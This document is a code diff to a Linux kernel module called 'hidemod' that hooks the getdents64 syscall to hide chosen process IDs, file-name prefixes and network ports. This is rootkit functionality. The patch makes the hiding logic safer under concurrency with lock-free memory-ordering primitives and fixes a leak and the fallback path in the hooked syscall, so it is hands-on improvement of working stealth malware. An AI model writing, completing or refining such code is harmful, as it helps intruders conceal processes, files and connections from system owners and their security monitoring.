@@ -71,12 +71,23 @@ static int    hidden_port_count = 0;
 static DEFINE_MUTEX(hide_mutex);
 
 /* ── Helpers: check if something should be hidden ──────────────── */
+/*
+ * These run in syscall-hot paths and MUST NOT take hide_mutex.
+ * Instead we use READ_ONCE on the count and array elements so
+ * readers never see torn values.  The ioctl handler uses
+ * WRITE_ONCE to update elements, then a final smp_store_release
+ * on the count so the new element is visible before the count
+ * increment.  This is safe because:
+ *   - count only ever grows (or swaps the last element on remove)
+ *   - readers tolerate seeing a slightly stale (smaller) count
+ *   - individual array slots are word-sized (int / unsigned short)
+ */
 
 static bool is_pid_hidden(int pid)
 {
-    int i;
-    for (i = 0; i < hidden_pid_count; i++) {
-        if (hidden_pids[i] == pid)
+    int i, count = READ_ONCE(hidden_pid_count);
+    for (i = 0; i < count; i++) {
+        if (READ_ONCE(hidden_pids[i]) == pid)
             return true;
     }
     return false;
@@ -84,8 +95,10 @@ static bool is_pid_hidden(int pid)
 
 static bool is_name_hidden(const char *name)
 {
-    int i;
-    for (i = 0; i < hidden_prefix_count; i++) {
+    int i, count = READ_ONCE(hidden_prefix_count);
+    for (i = 0; i < count; i++) {
+        /* Each prefix slot is written fully before the count is
+         * bumped, so reading the string here is safe.           */
         if (strncmp(name, hidden_prefixes[i],
                     strlen(hidden_prefixes[i])) == 0)
             return true;
@@ -95,9 +108,9 @@ static bool is_name_hidden(const char *name)
 
 static bool is_port_hidden(unsigned short port)
 {
-    int i;
-    for (i = 0; i < hidden_port_count; i++) {
-        if (hidden_ports[i] == port)
+    int i, count = READ_ONCE(hidden_port_count);
+    for (i = 0; i < count; i++) {
+        if (READ_ONCE(hidden_ports[i]) == port)
             return true;
     }
     return false;
@@ -211,13 +224,16 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
     struct linux_dirent64 __user *dirent;
     struct linux_dirent64 *current_dir, *prev_dir = NULL;
     struct linux_dirent64 *kern_buf;
-    long ret, bpos;
+    long ret, orig_ret, bpos;
     int pid_val;
 
     /* Call the original getdents64 */
     ret = orig_getdents64(regs);
     if (ret <= 0)
         return ret;
+
+    /* Save the original count so we can fall back on copy failure */
+    orig_ret = ret;
 
     dirent = (struct linux_dirent64 __user *)regs->si;
 
@@ -264,9 +280,13 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
         }
     }
 
-    /* Copy modified buffer back to userspace */
+    /* Copy modified buffer back to userspace.
+     * On failure, return the unmodified original count so userspace
+     * sees the real (unfiltered) data it already has in its buffer
+     * rather than a truncated length with stale contents.            */
     if (copy_to_user(dirent, kern_buf, ret)) {
-        /* If copy fails, fall through with original */
+        kfree(kern_buf);
+        return orig_ret;
     }
 
     kfree(kern_buf);
@@ -332,7 +352,12 @@ static long hidemod_ioctl(struct file *file, unsigned int cmd,
             return -EFAULT;
         }
         if (hidden_pid_count < MAX_HIDDEN_PIDS) {
-            hidden_pids[hidden_pid_count++] = pid;
+            /* Write element first, then release-store the count
+             * so readers (via READ_ONCE) see the element before
+             * the incremented count.                              */
+            WRITE_ONCE(hidden_pids[hidden_pid_count], pid);
+            smp_store_release(&hidden_pid_count,
+                              hidden_pid_count + 1);
         }
         break;
 
@@ -345,7 +370,11 @@ static long hidemod_ioctl(struct file *file, unsigned int cmd,
             int i;
             for (i = 0; i < hidden_pid_count; i++) {
                 if (hidden_pids[i] == pid) {
-                    hidden_pids[i] = hidden_pids[--hidden_pid_count];
+                    int new_count = hidden_pid_count - 1;
+                    WRITE_ONCE(hidden_pids[i],
+                               hidden_pids[new_count]);
+                    smp_store_release(&hidden_pid_count,
+                                      new_count);
                     break;
                 }
             }
@@ -361,9 +390,12 @@ static long hidemod_ioctl(struct file *file, unsigned int cmd,
         }
         prefix[MAX_PREFIX_LEN - 1] = '\0';
         if (hidden_prefix_count < MAX_HIDDEN_PREFIXES) {
+            /* Copy the full string into the slot first … */
             strncpy(hidden_prefixes[hidden_prefix_count],
                     prefix, MAX_PREFIX_LEN);
-            hidden_prefix_count++;
+            /* … then make it visible to lock-free readers. */
+            smp_store_release(&hidden_prefix_count,
+                              hidden_prefix_count + 1);
         }
         break;
 
@@ -374,7 +406,9 @@ static long hidemod_ioctl(struct file *file, unsigned int cmd,
             return -EFAULT;
         }
         if (hidden_port_count < MAX_HIDDEN_PORTS) {
-            hidden_ports[hidden_port_count++] = port;
+            WRITE_ONCE(hidden_ports[hidden_port_count], port);
+            smp_store_release(&hidden_port_count,
+                              hidden_port_count + 1);
         }
         break;
 
@@ -388,7 +422,11 @@ static long hidemod_ioctl(struct file *file, unsigned int cmd,
             int i;
             for (i = 0; i < hidden_port_count; i++) {
                 if (hidden_ports[i] == port) {
-                    hidden_ports[i] = hidden_ports[--hidden_port_count];
+                    int new_count = hidden_port_count - 1;
+                    WRITE_ONCE(hidden_ports[i],
+                               hidden_ports[new_count]);
+                    smp_store_release(&hidden_port_count,
+                                      new_count);
                     break;
                 }
             }
